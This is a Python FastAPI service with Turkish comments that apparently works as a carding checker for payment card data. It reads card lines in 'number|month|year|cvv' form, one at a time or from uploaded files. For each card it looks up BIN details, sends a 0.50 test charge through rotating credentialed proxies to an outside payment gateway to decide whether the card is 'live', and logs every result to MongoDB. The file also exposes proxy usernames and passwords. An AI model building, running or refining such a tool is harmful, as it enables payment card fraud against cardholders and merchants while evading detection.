from fastapi import FastAPI, UploadFile, File
from pydantic import BaseModel
import requests, re, time, random, itertools
from typing import List, Dict
from datetime import datetime
from pymongo import MongoClient

app = FastAPI(title="Full Checker API - BIN + Live + Balance")

# ================== MONGO DB ==================
MONGODB_URI = "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger"
try:
    client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
    db = client["paymentmanger"]
    collection = db["checkbalance"]
    print("[+] MongoDB bağlantısı başarılı")
except Exception as e:
    print(f"[!] MongoDB hatası: {e}")
    collection = None

# ================== PROXY ROTASYONU ==================
proxies_list = [
    "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
    "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
    "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
    "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
    "http://akifdemi55574:llfg52end4@191.96.30.51:21276"
]
proxy_cycle = itertools.cycle(proxies_list)

def get_bin_info(bin_number: str) -> Dict:
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number[:6]}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            return {
                "bin": bin_number[:6],
                "brand": data.get("scheme", "").upper(),
                "type": data.get("type", "").upper(),
                "level": data.get("brand", "").upper(),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("alpha2", "XX"),
                "country_name": data.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"bin": bin_number[:6], "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN", "bank": "Unknown", "country": "XX", "country_name": "Unknown"}

def save_to_mongodb(data: Dict):
    if not collection: return
    try:
        collection.insert_one({**data, "timestamp": datetime.utcnow()})
    except: pass

# ================== ANA KONTROL FONKSİYONU ==================
def full_check_card(card: str):
    proxy = next(proxy_cycle)
    cc = card.strip().split("|")
    if len(cc) < 4:
        return {"error": "Format hatalı"}

    number, month, year, cvv = cc[0], cc[1], cc[2], cc[3]
    bin_info = get_bin_info(number)

    # Live + Balance Check
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
    payload = {"card_number": number, "card_exp_month": month, "card_exp_year": year, "card_cvv": cvv, "amount": "0.50"}

    is_live = False
    balance = "0.00"

    for _ in range(2):
        try:
            r = requests.post("https://secure.payadultgateway.com/transaction", 
                              headers=headers, data=payload, proxies={"https": proxy}, timeout=15)
            bal = re.search(r'(\d+\.?\d*)', r.text)
            if bal:
                balance = bal.group(1)
                is_live = True
                break
        except:
            time.sleep(2)

    status = 1 if is_live else 0

    result = {
        "card": card,
        "bin": bin_info["bin"],
        "brand": bin_info["brand"],
        "type": bin_info["type"],
        "level": bin_info["level"],
        "bank": bin_info["bank"],
        "country": bin_info["country"],
        "country_name": bin_info["country_name"],
        "live": is_live,
        "balance": balance,
        "status": status
    }

    save_to_mongodb(result)
    return result

# ================== ENDPOINTLER ==================
@app.post("/fullcheck")
async def fullcheck(cards: List[str]):
    results = [full_check_card(card) for card in cards if card.strip()]
    return {"total": len(results), "results": results}

@app.post("/bincheck")
async def bincheck(cards: List[str]):
    results = []
    for card in cards:
        if card.strip():
            bin_info = get_bin_info(card.split("|")[0])
            results.append(bin_info)
    return {"results": results}

@app.post("/bulkcheck/file")
async def from_file(file: UploadFile = File(...)):
    content = await file.read()
    cards = content.decode("utf-8").splitlines()
    return await fullcheck(cards)

@app.get("/")
async def home():
    return {"status": "API aktif", "endpoints": ["/fullcheck", "/bincheck", "/docs"]}
